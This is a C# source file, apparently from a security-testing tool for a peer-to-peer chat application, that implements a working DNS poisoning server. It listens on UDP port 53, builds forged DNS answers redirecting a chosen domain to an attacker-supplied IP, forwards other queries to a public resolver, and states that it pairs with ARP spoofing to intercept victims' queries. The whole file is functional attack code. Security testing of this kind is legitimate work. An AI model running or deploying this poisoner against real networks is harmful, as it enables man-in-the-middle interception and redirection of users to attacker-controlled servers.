using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using ChatP2P.SecurityTester.Models;

namespace ChatP2P.SecurityTester.Network
{
    /// <summary>
    /// 🌐 Module DNS Poisoning pour redirection de domaines vers IP attaquant
    /// Fonctionne en combinaison avec ARP Spoofing pour intercepter requêtes DNS
    /// </summary>
    public class DNSPoisoner
    {
        private UdpClient? _dnsServer;
        private bool _isRunning = false;
        private CancellationTokenSource? _cancellationToken;
        private readonly Dictionary<string, string> _dnsRules = new();

        public event Action<string>? LogMessage;
        public event Action<AttackResult>? DNSResponseSent;

        public async Task<bool> StartDNSPoisoning(string targetDomain, string redirectIP)
        {
            try
            {
                LogMessage?.Invoke($"🌐 [DNS-POISONING] Starting DNS poisoning server...");
                LogMessage?.Invoke($"   🎯 Target Domain: {targetDomain}");
                LogMessage?.Invoke($"   🔀 Redirect IP: {redirectIP}");

                // Validation des paramètres
                if (!IPAddress.TryParse(redirectIP, out var ipAddress))
                {
                    LogMessage?.Invoke($"❌ [DNS-POISONING] Invalid redirect IP: {redirectIP}");
                    return false;
                }

                // Ajouter règle de redirection
                _dnsRules.Clear();
                _dnsRules[targetDomain.ToLower()] = redirectIP;
                LogMessage?.Invoke($"✅ [DNS-POISONING] DNS rule added: {targetDomain} → {redirectIP}");

                // Démarrer serveur DNS sur port 53
                _dnsServer = new UdpClient(53);
                _isRunning = true;
                _cancellationToken = new CancellationTokenSource();

                LogMessage?.Invoke($"🚀 [DNS-POISONING] DNS server started on port 53");
                LogMessage?.Invoke($"📡 [DNS-POISONING] Listening for DNS queries from poisoned clients...");
                LogMessage?.Invoke($"⚠️  [DNS-POISONING] Make sure ARP spoofing is active to redirect DNS traffic!");

                // Démarrer l'écoute des requêtes DNS
                _ = Task.Run(async () => await ListenForDNSQueries(_cancellationToken.Token));

                DNSResponseSent?.Invoke(new AttackResult
                {
                    Success = true,
                    AttackType = "DNS_POISONING_START",
                    Description = $"DNS Poisoning active: {targetDomain} → {redirectIP}",
                    TargetPeer = targetDomain
                });

                return true;
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ [DNS-POISONING] Error starting DNS poisoning: {ex.Message}");
                return false;
            }
        }

        private async Task ListenForDNSQueries(CancellationToken cancellationToken)
        {
            try
            {
                LogMessage?.Invoke($"🔍 [DNS-POISONING] DNS listener started - waiting for queries...");

                while (_isRunning && !cancellationToken.IsCancellationRequested)
                {
                    try
                    {
                        var result = await _dnsServer!.ReceiveAsync();
                        var dnsQuery = result.Buffer;
                        var clientEndpoint = result.RemoteEndPoint;

                        LogMessage?.Invoke($"📨 [DNS-POISONING] DNS query received from {clientEndpoint}");

                        // Parser et traiter la requête DNS
                        await ProcessDNSQuery(dnsQuery, clientEndpoint);
                    }
                    catch (Exception ex) when (!cancellationToken.IsCancellationRequested)
                    {
                        LogMessage?.Invoke($"⚠️ [DNS-POISONING] Error processing DNS query: {ex.Message}");
                    }
                }
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ [DNS-POISONING] DNS listener error: {ex.Message}");
            }
        }

        private async Task ProcessDNSQuery(byte[] dnsQuery, IPEndPoint clientEndpoint)
        {
            try
            {
                // Parser simple de la requête DNS
                var domain = ExtractDomainFromDNSQuery(dnsQuery);

                if (string.IsNullOrEmpty(domain))
                {
                    LogMessage?.Invoke($"⚠️ [DNS-POISONING] Could not extract domain from query");
                    return;
                }

                LogMessage?.Invoke($"🔍 [DNS-POISONING] Query for domain: {domain}");

                // Vérifier si on a une règle pour ce domaine
                if (_dnsRules.TryGetValue(domain.ToLower(), out var redirectIP))
                {
                    LogMessage?.Invoke($"🎯 [DNS-POISONING] MATCH FOUND! Poisoning {domain} → {redirectIP}");

                    // Créer réponse DNS empoisonnée
                    var poisonedResponse = CreatePoisonedDNSResponse(dnsQuery, domain, redirectIP);

                    // Envoyer la réponse empoisonnée
                    await _dnsServer!.SendAsync(poisonedResponse, poisonedResponse.Length, clientEndpoint);

                    LogMessage?.Invoke($"✅ [DNS-POISONING] Poisoned response sent to {clientEndpoint}");
                    LogMessage?.Invoke($"   🕷️ Client will now resolve {domain} to {redirectIP}");

                    DNSResponseSent?.Invoke(new AttackResult
                    {
                        Success = true,
                        AttackType = "DNS_RESPONSE_POISONED",
                        Description = $"DNS response poisoned: {domain} → {redirectIP}",
                        TargetPeer = clientEndpoint.ToString(),
                        Details = $"Client {clientEndpoint} will resolve {domain} to {redirectIP}"
                    });
                }
                else
                {
                    LogMessage?.Invoke($"📤 [DNS-POISONING] No rule for {domain} - forwarding to real DNS");
                    // Optionnel: Forwarder vers un vrai serveur DNS
                    await ForwardToRealDNS(dnsQuery, clientEndpoint, domain);
                }
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ [DNS-POISONING] Error processing query: {ex.Message}");
            }
        }

        private string ExtractDomainFromDNSQuery(byte[] dnsQuery)
        {
            try
            {
                // DNS query structure: Header(12 bytes) + Question
                if (dnsQuery.Length < 13) return "";

                // Skip DNS header (12 bytes) et parser question section
                int offset = 12;
                var domainParts = new List<string>();

                while (offset < dnsQuery.Length)
                {
                    byte length = dnsQuery[offset];
                    if (length == 0) break; // End of domain name

                    offset++;
                    if (offset + length > dnsQuery.Length) break;

                    string part = Encoding.ASCII.GetString(dnsQuery, offset, length);
                    domainParts.Add(part);
                    offset += length;
                }

                return string.Join(".", domainParts);
            }
            catch
            {
                return "";
            }
        }

        private byte[] CreatePoisonedDNSResponse(byte[] originalQuery, string domain, string redirectIP)
        {
            try
            {
                // Créer une réponse DNS basique
                var response = new List<byte>();

                // Copy original query ID (2 bytes)
                response.AddRange(originalQuery[0..2]);

                // DNS flags: Standard query response, no error
                response.Add(0x81); // QR=1, Opcode=0, AA=1, TC=0, RD=0
                response.Add(0x80); // RA=1, Z=0, RCODE=0

                // Questions count (2 bytes) - same as original
                response.AddRange(originalQuery[4..6]);

                // Answer count (2 bytes) - 1 answer
                response.Add(0x00);
                response.Add(0x01);

                // Authority and Additional counts (4 bytes) - 0
                response.AddRange(new byte[] { 0x00, 0x00, 0x00, 0x00 });

                // Copy question section from original query
                int questionStart = 12;
                int questionEnd = FindQuestionEnd(originalQuery, questionStart);
                response.AddRange(originalQuery[questionStart..questionEnd]);

                // Add answer section
                // Name (compressed pointer to question)
                response.Add(0xC0);
                response.Add(0x0C);

                // Type (A record) and Class (IN)
                response.AddRange(new byte[] { 0x00, 0x01, 0x00, 0x01 });

                // TTL (4 bytes) - 300 seconds
                response.AddRange(new byte[] { 0x00, 0x00, 0x01, 0x2C });

                // Data length (2 bytes) - 4 for IPv4
                response.AddRange(new byte[] { 0x00, 0x04 });

                // IP address (4 bytes)
                var ipBytes = IPAddress.Parse(redirectIP).GetAddressBytes();
                response.AddRange(ipBytes);

                return response.ToArray();
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ [DNS-POISONING] Error creating response: {ex.Message}");
                return Array.Empty<byte>();
            }
        }

        private int FindQuestionEnd(byte[] query, int start)
        {
            int offset = start;

            // Skip domain name
            while (offset < query.Length && query[offset] != 0)
            {
                offset += query[offset] + 1;
            }
            offset++; // Skip null terminator

            // Skip QTYPE and QCLASS (4 bytes)
            offset += 4;

            return offset;
        }

        private async Task ForwardToRealDNS(byte[] dnsQuery, IPEndPoint clientEndpoint, string domain)
        {
            try
            {
                // Forwarder vers Google DNS (8.8.8.8)
                using var forwarder = new UdpClient();
                var googleDNS = new IPEndPoint(IPAddress.Parse("8.8.8.8"), 53);

                await forwarder.SendAsync(dnsQuery, dnsQuery.Length, googleDNS);
                var result = await forwarder.ReceiveAsync();

                // Renvoyer la vraie réponse au client
                await _dnsServer!.SendAsync(result.Buffer, result.Buffer.Length, clientEndpoint);

                LogMessage?.Invoke($"📡 [DNS-POISONING] Forwarded real response for {domain} to {clientEndpoint}");
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ [DNS-POISONING] Error forwarding DNS: {ex.Message}");
            }
        }

        public void StopDNSPoisoning()
        {
            try
            {
                _isRunning = false;
                _cancellationToken?.Cancel();
                _dnsServer?.Close();
                _dnsServer = null;

                LogMessage?.Invoke($"⏹️ [DNS-POISONING] DNS poisoning stopped");

                DNSResponseSent?.Invoke(new AttackResult
                {
                    Success = true,
                    AttackType = "DNS_POISONING_STOP",
                    Description = "DNS Poisoning service stopped"
                });
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ [DNS-POISONING] Error stopping DNS poisoning: {ex.Message}");
            }
        }

        public async Task<bool> TestDNSResolution(string domain, string expectedIP)
        {
            try
            {
                LogMessage?.Invoke($"🧪 [DNS-TEST] Testing DNS resolution for {domain}...");

                // Tester la résolution DNS
                var hostEntry = await Dns.GetHostEntryAsync(domain);
                var actualIP = hostEntry.AddressList[0].ToString();

                LogMessage?.Invoke($"🔍 [DNS-TEST] {domain} resolves to: {actualIP}");

                if (actualIP == expectedIP)
                {
                    LogMessage?.Invoke($"✅ [DNS-TEST] SUCCESS! {domain} correctly resolves to {expectedIP}");
                    return true;
                }
                else
                {
                    LogMessage?.Invoke($"❌ [DNS-TEST] FAIL! Expected {expectedIP}, got {actualIP}");
                    return false;
                }
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ [DNS-TEST] Test failed: {ex.Message}");
                return false;
            }
        }

        public bool IsRunning => _isRunning;

        public Dictionary<string, string> GetActiveDNSRules()
        {
            return new Dictionary<string, string>(_dnsRules);
        }
    }
}